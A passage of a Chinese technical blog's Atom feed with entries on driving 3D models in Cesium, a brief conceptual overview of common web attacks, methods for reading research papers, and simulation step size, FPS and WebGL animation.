    
      <category term="计算机安全" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Cesium中3D模型的驱动方法</title>
    <link href="https://huangwang.github.io/2018/12/26/Cesium%E4%B8%AD3D%E6%A8%A1%E5%9E%8B%E7%9A%84%E9%A9%B1%E5%8A%A8%E6%96%B9%E6%B3%95/"/>
    <id>https://huangwang.github.io/2018/12/26/Cesium中3D模型的驱动方法/</id>
    <published>2018-12-26T12:43:21.000Z</published>
    <updated>2018-12-26T14:13:15.000Z</updated>
    
    <content type="html"><![CDATA[<p>Cesium中3D模型的运动可以使用CZML直接驱动，但使用该方法前提是能事先计算出3D模型的运动轨迹，具有很大的局限性。那么如何实时驱动3D模型呢？</p><h1 id="Cesium渲染过程分析"><a href="#Cesium渲染过程分析" class="headerlink" title="Cesium渲染过程分析"></a>Cesium渲染过程分析</h1><p>Cesium渲染过程的分析可以参考链接1。Cesium的渲染始于虚拟地球组件CesiumWidget的startRenderLoop方法，在该方法中将调用requestAnimationFrame函数开始渲染。</p><p>虚拟地球组件CesiumWidget包含Scene组件，在其render方法随后调用Scene的render方法。在场景组件Scene的render方法中提供了preUpdate、postUpdate、preRender、postRender四个事件对象，这四个事件对象将是我们实时驱动3D模型的关键。</p><h2 id="preUpdate事件"><a href="#preUpdate事件" class="headerlink" title="preUpdate事件"></a>preUpdate事件</h2><p>在Cesium更新渲染周期开始之前以目标帧率触发preUpdate事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">scene.postUpdate.addEventListener(function() &#123;</span><br><span class="line">    // This code will run at 60 FPS</span><br><span class="line">    if (changeToPromptRender) &#123;</span><br><span class="line">        scene.requestRender();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="postUpdate事件"><a href="#postUpdate事件" class="headerlink" title="postUpdate事件"></a>postUpdate事件</h2><p>在场景更新之后，新帧渲染之前以目标帧率触发postUpdate事件。</p><h2 id="preRender事件"><a href="#preRender事件" class="headerlink" title="preRender事件"></a>preRender事件</h2><p>在场景更新之后，新帧渲染之前触发preRender事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scene.preRender.addEventListener(function() &#123;</span><br><span class="line">    // This code will run when a new frame is rendered</span><br><span class="line">    // including when changeToPromptRender is true</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="postRender事件"><a href="#postRender事件" class="headerlink" title="postRender事件"></a>postRender事件</h2><p>在新帧渲染之后触发postRender事件。</p><h1 id="实时驱动3D模型"><a href="#实时驱动3D模型" class="headerlink" title="实时驱动3D模型"></a>实时驱动3D模型</h1><p>从上一节对Cesium渲染过程分析可知，要实时驱动3D模型，应订阅场景Scene的preUpdate事件，在preUpdate事件的处理函数中改变3D模型的位置和姿态。</p><h2 id="订阅preUpdate事件"><a href="#订阅preUpdate事件" class="headerlink" title="订阅preUpdate事件"></a>订阅preUpdate事件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//订阅场景的preUpdate事件</span><br><span class="line">viewer.scene.preUpdate.addEventListener(function(scene, time) &#123;</span><br><span class="line">    speedVector = Cesium.Cartesian3.multiplyByScalar(Cesium.Cartesian3.UNIT_X, speed / 10, speedVector);</span><br><span class="line">    position = Cesium.Matrix4.multiplyByPoint(planePrimitive.modelMatrix, speedVector, position);</span><br><span class="line">    pathPosition.addSample(Cesium.JulianDate.now(), position);</span><br><span class="line">    Cesium.Transforms.headingPitchRollToFixedFrame(position, hpRoll, Cesium.Ellipsoid.WGS84, fixedFrameTransform, planePrimitive.modelMatrix);</span><br><span class="line"></span><br><span class="line">    if (fromBehind.checked) &#123;</span><br><span class="line">        // Zoom to model</span><br><span class="line">        Cesium.Matrix4.multiplyByPoint(planePrimitive.modelMatrix, planePrimitive.boundingSphere.center, center);</span><br><span class="line">        hpRange.heading = hpRoll.heading;</span><br><span class="line">        hpRange.pitch = hpRoll.pitch;</span><br><span class="line">        camera.lookAt(center, hpRange);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="获取czml实体的参数"><a href="#获取czml实体的参数" class="headerlink" title="获取czml实体的参数"></a>获取czml实体的参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">viewer.scene.preUpdate.addEventListener(function(scene, time) &#123;</span><br><span class="line">    //target是czml实体对象</span><br><span class="line">    //获取time时刻target的位置参数</span><br><span class="line">    target.position.getValue(time,position)</span><br><span class="line">    console.log(position)</span><br><span class="line">    </span><br><span class="line">    target.orientation.getValue(time,orientation)</span><br><span class="line">    console.log(orientation)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">viewer.scene.preUpdate.addEventListener(function(scene, time) &#123;</span><br><span class="line">    var pos=target.position.getValue(time)</span><br><span class="line">    console.log(pos.toString())</span><br><span class="line">    //世界坐标转经纬高</span><br><span class="line">    var cartographicPosition = Cesium.Ellipsoid.WGS84.cartesianToCartographic(pos);</span><br><span class="line">    console.log(cartographicPosition.toString())</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="使用Entity-API加载3D模型"><a href="#使用Entity-API加载3D模型" class="headerlink" title="使用Entity API加载3D模型"></a>使用Entity API加载3D模型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;);</span><br><span class="line">var center=Cesium.Cartesian3.fromDegrees(-123.0744619, 44.0503706,100);</span><br><span class="line">var hpr=Cesium.HeadingPitchRoll.fromDegrees(90,-90,0);</span><br><span class="line">//从headingPitchRoll转四元数</span><br><span class="line">var quatern=Cesium.Transforms.headingPitchRollQuaternion(center,hpr);</span><br><span class="line"></span><br><span class="line">var entity = viewer.entities.add(&#123;</span><br><span class="line">    position :center ,    </span><br><span class="line">    orientation:quatern ,</span><br><span class="line">    model : &#123;</span><br><span class="line">        uri : &apos;../../../../Apps/SampleData/models/missile.glb&apos;,</span><br><span class="line">        scale: 0.1,</span><br><span class="line">        minimumPixelSize:50,</span><br><span class="line">        maximumScale:5000</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">viewer.trackedEntity = entity;</span><br></pre></td></tr></table></figure><h2 id="使用Primitive-API加载3d模型"><a href="#使用Primitive-API加载3d模型" class="headerlink" title="使用Primitive API加载3d模型"></a>使用Primitive API加载3d模型</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var viewer = new Cesium.Viewer(&apos;cesiumContainer&apos;);</span><br><span class="line"></span><br><span class="line">var center1=Cesium.Cartesian3.fromDegrees(-123.0744619, 44.0503706,100);</span><br><span class="line">var hpr1=Cesium.HeadingPitchRoll.fromDegrees(90,-90,100);</span><br><span class="line">//计算模式矩阵，实现本地坐标系坐标到世界坐标系坐标的转换</span><br><span class="line">var modelMatrix=Cesium.Transforms.headingPitchRollToFixedFrame(center1, hpr1)</span><br><span class="line"></span><br><span class="line">var model = viewer.scene.primitives.add(Cesium.Model.fromGltf(&#123;</span><br><span class="line">    url : &apos;../../../../Apps/SampleData/models/missile.glb&apos;,</span><br><span class="line">    modelMatrix : modelMatrix,</span><br><span class="line">    scale : 1.0</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://huangwang.github.io/2018/11/08/Cesium摄像头跟踪飞机实体时晃动问题分析/">Cesium摄像头跟踪飞机实体时晃动问题分析</a>,by jack huang.</li><li><a href="https://cesium.com/blog/2018/01/24/cesium-scene-rendering-performance/" target="_blank" rel="noopener">Improving Performance with Explicit Rendering</a>, by Gabby Getz.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Cesium中3D模型的运动可以使用CZML直接驱动，但使用该方法前提是能事先计算出3D模型的运动轨迹，具有很大的局限性。那么如何实时驱动3D模型呢？&lt;/p&gt;
&lt;h1 id=&quot;Cesium渲染过程分析&quot;&gt;&lt;a href=&quot;#Cesium渲染过程分析&quot; class=&quot;head
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="Cesium" scheme="https://huangwang.github.io/tags/Cesium/"/>
    
  </entry>
  
  <entry>
    <title>网络安全攻防技术探讨</title>
    <link href="https://huangwang.github.io/2018/12/22/Web%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF%E6%8E%A2%E8%AE%A8/"/>
    <id>https://huangwang.github.io/2018/12/22/Web安全攻防技术探讨/</id>
    <published>2018-12-22T05:16:18.000Z</published>
    <updated>2018-12-22T05:52:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>网络安全（英语：network security）包含网络设备安全、网络信息安全、网络软件安全。在此重点探讨网络软件安全中的Web安全。当前Web安全面临的压力越来越大，一方面是Web应用一统江湖，君临天下，另一方面针对Web应用的攻击越来越多，攻击方法越来越成熟。下面重点介绍常见的Web攻击方法。</p><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS (Cross Site Script，跨站脚本攻击)的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。</p><h2 id="非持久型-XSS"><a href="#非持久型-XSS" class="headerlink" title="非持久型 XSS"></a>非持久型 XSS</h2><h2 id="持久型-XSS"><a href="#持久型-XSS" class="headerlink" title="持久型 XSS"></a>持久型 XSS</h2><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>CSRF（Cross-Site Request Forgery,跨站请求伪造攻击）可以盗用你的登陆信息，以你的身份模拟发送各种请求。</p><h1 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h1><p>SQL 注入漏洞（SQL Injection）是 Web 开发中最常见的一种安全漏洞。可以用它来从数据库获取敏感信息，或者利用数据库的特性执行添加用户，导出文件等一系列恶意操作，甚至有可能获取数据库乃至系统用户最高权限。</p><h1 id="命令行注入"><a href="#命令行注入" class="headerlink" title="命令行注入"></a>命令行注入</h1><p>命令行注入漏洞，指的是攻击者能够通过 HTTP 请求直接侵入主机，执行攻击者预设的 shell 命令。</p><h1 id="DDoS-攻击"><a href="#DDoS-攻击" class="headerlink" title="DDoS 攻击"></a>DDoS 攻击</h1><p>DDoS 又叫分布式拒绝服务，全称 Distributed Denial of Service，其原理就是利用大量的请求造成资源过载，导致服务不可用。</p><h2 id="网络层-DDoS"><a href="#网络层-DDoS" class="headerlink" title="网络层 DDoS"></a>网络层 DDoS</h2><h2 id="应用层-DDoS"><a href="#应用层-DDoS" class="headerlink" title="应用层 DDoS"></a>应用层 DDoS</h2><h1 id="流量劫持"><a href="#流量劫持" class="headerlink" title="流量劫持"></a>流量劫持</h1><p>流量劫持是黑产行业的一大经济支柱。</p><h2 id="DNS-劫持"><a href="#DNS-劫持" class="headerlink" title="DNS 劫持"></a>DNS 劫持</h2><h2 id="HTTP-劫持"><a href="#HTTP-劫持" class="headerlink" title="HTTP 劫持"></a>HTTP 劫持</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://blog.georgovassilis.com/2016/04/16/advanced-web-security-topics/" target="_blank" rel="noopener">Advanced web security topics</a>,by George.</li><li><a href="https://zh.wikipedia.org/wiki/网络安全" target="_blank" rel="noopener">网络安全</a>,by wikipedia.</li><li><a href="https://zoumiaojiang.com/article/common-web-security/" target="_blank" rel="noopener">常见 Web 安全攻防总结</a>,by zoumiaojiang.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;网络安全（英语：network security）包含网络设备安全、网络信息安全、网络软件安全。在此重点探讨网络软件安全中的Web安全。当前Web安全面临的压力越来越大，一方面是Web应用一统江湖，君临天下，另一方面针对Web应用的攻击越来越多，攻击方法越来越成熟。下面重点
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="计算机安全" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8/"/>
    
      <category term="网络安全" scheme="https://huangwang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>科学研究中阅读论文的方法</title>
    <link href="https://huangwang.github.io/2018/12/20/%E7%A7%91%E5%AD%A6%E7%A0%94%E7%A9%B6%E4%B8%AD%E9%98%85%E8%AF%BB%E8%AE%BA%E6%96%87%E7%9A%84%E6%96%B9%E6%B3%95/"/>
    <id>https://huangwang.github.io/2018/12/20/科学研究中阅读论文的方法/</id>
    <published>2018-12-20T15:44:44.000Z</published>
    <updated>2018-12-20T16:07:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>在科学研究的过程中，选题十分重要。因此在初步确定好选题方向后，应对该选题方向进行调研。调研的主要工作就是寻找该方向的论文，进行阅读、分析、总结，了解该方向的过去和现在，并预测未来可能的发展方向。对于刚上研究生的同学，该采用什么样的方法来整理选题方向上的论文，使之符合逻辑，并且条理清晰呢？偶尔拜读了Flood Sung写的文章”深度学习论文阅读路线图“，觉得深受启发，将其所提出的深度学习论文阅读路线图构建原则记录备忘一下。</p><h1 id="路线图的构建原则"><a href="#路线图的构建原则" class="headerlink" title="路线图的构建原则"></a>路线图的构建原则</h1><p>有以下四个原则：</p><ul><li>从整体到局部。即从Survey的文章，影响大局的文章到具体子问题子领域的文章。</li><li>从过去到最前沿。即每个topic的文章是按照时间顺序排列的，这样大家就可以清楚的看到这个方向的研究发展脉络。</li><li>从通用到应用。即有些深度学习的文章是面向深度学习通用理论，比如Resnet，可以用在任意的神经网络中，而有些文章则是具体应用，比如Image Caption。</li><li>面向最前沿。收集的文章会有很多是最新的，甚至就是几天前出来的，这样能保证路线图是最新的。</li></ul><p>每一种topic只选择最有代表性的几篇文章，比如深度增强学习（Deep Reinforcement Learning），这个领域现在有几十篇文章，但只选择几篇，要深入了解甚至做为自己的研究方向，还需要进一步的阅读该领域的文章。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://zhuanlan.zhihu.com/p/23080129" target="_blank" rel="noopener">深度学习论文阅读路线图 Deep Learning Papers Reading Roadmap</a>,by Flood Sung.</li><li><a href="https://github.com/floodsung/Deep-Learning-Papers-Reading-Roadmap" target="_blank" rel="noopener">Deep Learning Papers Reading Roadmap</a>,by Flood Sung.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在科学研究的过程中，选题十分重要。因此在初步确定好选题方向后，应对该选题方向进行调研。调研的主要工作就是寻找该方向的论文，进行阅读、分析、总结，了解该方向的过去和现在，并预测未来可能的发展方向。对于刚上研究生的同学，该采用什么样的方法来整理选题方向上的论文，使之符合逻辑，并
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="科研" scheme="https://huangwang.github.io/tags/%E7%A7%91%E7%A0%94/"/>
    
  </entry>
  
  <entry>
    <title>系统仿真中一些问题的思考</title>
    <link href="https://huangwang.github.io/2018/12/18/%E7%B3%BB%E7%BB%9F%E4%BB%BF%E7%9C%9F%E4%B8%AD%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>https://huangwang.github.io/2018/12/18/系统仿真中一些问题的思考/</id>
    <published>2018-12-18T10:41:42.000Z</published>
    <updated>2018-12-18T14:49:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>系统仿真（system simulation）就是根据系统分析的目的，在分析系统各要素性质及其相互关系的基础上，建立能描述系统结构或行为过程的、且具有一定逻辑关系或数量关系的仿真模型，据此进行试验或定量分析，以获得正确决策所需的各种信息。</p><h1 id="系统仿真与仿真游戏的区别"><a href="#系统仿真与仿真游戏的区别" class="headerlink" title="系统仿真与仿真游戏的区别"></a>系统仿真与仿真游戏的区别</h1><p>系统仿真与仿真游戏本质上没有区别，都是计算机程序对现实的模拟，所不同的是各自对仿真保真度（Simulation Fidelity）的要求不同。</p><p>仿真保真度（Simulation Fidelity）用于描述仿真精度，模拟真实对应物有多近似：</p><ul><li>低保真：对系统的最小模拟，接受输入产生输出</li><li>中等保真：对刺激能自动响应，有限精度</li><li>高保真：接近不可辨识或者尽可能地接近真实系统</li></ul><p>通常系统仿真对仿真保真度的要求比仿真游戏要高。</p><h1 id="计算步长与采样周期"><a href="#计算步长与采样周期" class="headerlink" title="计算步长与采样周期"></a>计算步长与采样周期</h1><p>采用计算机进行数值模拟或系统仿真时，经常需要采用数值解法求解模型方程。系统模型一般采用微分方程描述（也有其它形式），采用数值方法求解，就是采用迭代法逐步逼近。</p><h2 id="计算步长"><a href="#计算步长" class="headerlink" title="计算步长"></a>计算步长</h2><p>积分与微分是互逆。对一个曲线（包括直线）方程求积分，其实就是求曲线与横轴围成的面积。该面积可以用一系列间隔很小的面积块相加得到。这些小间隔的宽度就是计算步长。显然，纯粹从精度的角度考虑，步长越小越精确，因为近似面积更接近实际图形面积。</p><h2 id="采样周期"><a href="#采样周期" class="headerlink" title="采样周期"></a>采样周期</h2><p>采样周期是对一个实际信号测量时，相邻两次测量之间的时间间隔。有时候，采样周期和计算步长相似，但采样周期要考虑实际限制，且是时间单位，而计算步长不一定是时间单位，且相对自由些。两者在数值上没必然联系。<strong>对于同一问题，且都是时间量纲的话，采样周期大于等于计算步长，前者是后者的整数倍</strong>。</p><p>系统仿真包含系统模型求解，也就是在每个采样周期内，要解出模型方程。控制系统仿真时在采样周期内要解出两个模型方程：控制器模型和系统模型。</p><p><strong>一个采样周期内可对系统模型迭代求解一次或多次</strong>。</p><h2 id="计算步长和采样周期大小的选择"><a href="#计算步长和采样周期大小的选择" class="headerlink" title="计算步长和采样周期大小的选择"></a>计算步长和采样周期大小的选择</h2><p>关于采样周期和计算步长的选择，一般考虑以下因素：</p><ul><li><p>从求解精度考虑，越小越好。</p></li><li><p>从计算量考虑，越大越好。</p></li></ul><h2 id="采样周期与每秒帧数-Frames-Per-Second，FPS"><a href="#采样周期与每秒帧数-Frames-Per-Second，FPS" class="headerlink" title="采样周期与每秒帧数(Frames Per Second，FPS)"></a>采样周期与每秒帧数(Frames Per Second，FPS)</h2><p>采样周期以秒为单位，则</p><script type="math/tex; mode=display">FPS=\frac{1}{采样周期}</script><p>FPS是指每秒画面重绘的次数，用于衡量画面切换速度。FPS越大，则动画效果越平滑，当FPS小于20时，一般就能明显感受到画面的卡滞现象。</p><p>当FPS足够大(比如达到60)，再增加帧数人眼也不会感受到明显的变化，反而相应地就要消耗更多资源(比如电影的胶片就需要更长了，或是电脑刷新画面需要消耗计算资源等等)。因此，选择一个适中的FPS即可。</p><p>NTSC标准的电视FPS是30，PAL标准的电视FPS是25，电影的FPS标准为24。</p><h1 id="WebGL动画"><a href="#WebGL动画" class="headerlink" title="WebGL动画"></a>WebGL动画</h1><p>WebGL是一种JavaScript API，用于在不使用插件的情况下在任何兼容的网页浏览器中呈现交互式2D和3D图形。但要产生WebGL动画，需要对运动的场景不停的采样，即不停地拍照。JavaScript的采样函数主要有setInterval方法和requestAnimationFrame方法。</p><h2 id="setInterval方法"><a href="#setInterval方法" class="headerlink" title="setInterval方法"></a>setInterval方法</h2><blockquote><p>如果要设置特定的FPS(虽然严格来说，即使使用这种方法，JavaScript也不能保证帧数精确性)，可以使用JavaScript DOM定义的方法：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setInterval(fn,mesc)</span><br></pre></td></tr></table></figure><p>其中，fn是每过msec毫秒执行的函数，如果将fn定义为重绘画面的函数，就能实现动画效果。setInterval函数返回一个变量timer，如果需要停止重绘，需要使用clearInterval方法，并传入该变量timer。</p><h2 id="requestAnimationFrame方法"><a href="#requestAnimationFrame方法" class="headerlink" title="requestAnimationFrame方法"></a>requestAnimationFrame方法</h2><blockquote><p>大多数时候，我们并不在意多久重绘一次，这时候就适合用requestAnimationFrame方法了。它告诉浏览器在合适的时候调用指定函数，通常可能达到60FPS。</p></blockquote><ul><li>requestAnimationFrame同样有对应的cancelAnimationFrame取消动画</li><li>和setInterval不同的是，由于requestAnimationFrame只请求一帧画面，因此，除了在init函数中需要调用，在被其调用的函数中需要再次调用requestAnimationFrame</li></ul><h2 id="使用stat-js记录FPS"><a href="#使用stat-js记录FPS" class="headerlink" title="使用stat.js记录FPS"></a>使用stat.js记录FPS</h2><p>stat.js是Three.js的作者Mr.Doob的另一个有用的JavaScript库。很多情况下，我们希望知道实时的FPS信息，从而更好地监测动画效果。这时候，stat.js就能提供一个很好的帮助，它占据屏幕中的一小块位置(如左上角)，显示实时的FPS信息。</p><p>在HTML中引用stat.js:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;//mrdoob.github.io/stats.js/build/stats.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>再使用如下代码监视实时FPS：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var stats = new Stats();</span><br><span class="line">stats.showPanel( 1 ); // 0: fps, 1: ms, 2: mb, 3+: custom</span><br><span class="line">document.body.appendChild( stats.dom );</span><br><span class="line"></span><br><span class="line">function animate() &#123;</span><br><span class="line"></span><br><span class="line">stats.begin();</span><br><span class="line"></span><br><span class="line">// monitored code goes here</span><br><span class="line"></span><br><span class="line">stats.end();</span><br><span class="line"></span><br><span class="line">requestAnimationFrame( animate );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">requestAnimationFrame( animate );</span><br></pre></td></tr></table></figure></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="http://blog.sciencenet.cn/blog-341979-776318.html" target="_blank" rel="noopener">计算步长和采样周期</a>,by 王永林.</li><li><a href="http://www.ufgame.com/5951.html" target="_blank" rel="noopener">离散和连续模拟之间的实际区别是什么？</a>,by UF Game.</li><li><a href="https://baike.baidu.com/item/系统仿真" target="_blank" rel="noopener">系统仿真</a>,by 百度百科.</li><li><a href="https://www.ibm.com/developerworks/cn/opensource/os-physicsengines/index.html" target="_blank" rel="noopener">开源的物理引擎</a>,by M. Jones.</li><li><a href="https://zh.wikipedia.org/wiki/数值分析" target="_blank" rel="noopener">数值分析</a>,by wikipedia.</li><li><a href="https://segmentfault.com/a/1190000012238927" target="_blank" rel="noopener">three.js 入门详解(二)</a>,by Levi.</li><li><a href="https://zh.wikipedia.org/wiki/WebGL" target="_blank" rel="noopener">WebGL</a>,by wikipedia.</li><li><a href="https://github.com/mrdoob/stats.js" target="_blank" rel="noopener">stats.js</a>, by mydoob.</li><li><a href="https://zhuanlan.zhihu.com/p/33058983" target="_blank" rel="noopener">详解JavaScript中的Event Loop（事件循环）机制</a>,by 暮雨清秋.</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;系统仿真（system simulation）就是根据系统分析的目的，在分析系统各要素性质及其相互关系的基础上，建立能描述系统结构或行为过程的、且具有一定逻辑关系或数量关系的仿真模型，据此进行试验或定量分析，以获得正确决策所需的各种信息。&lt;/p&gt;
&lt;h1 id=&quot;系统仿真与
      
    
    </summary>
    
    
      <category term="笔记本" scheme="https://huangwang.github.io/tags/%E7%AC%94%E8%AE%B0%E6%9C%AC/"/>
    
      <category term="3D" scheme="https://huangwang.github.io/tags/3D/"/>
    
      <category term="计算机仿真" scheme="https://huangwang.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BB%BF%E7%9C%9F/"/>
    
      <category term="WebGL" scheme="https://huangwang.github.io/tags/WebGL/"/>
    
  </entry>
  
</feed>
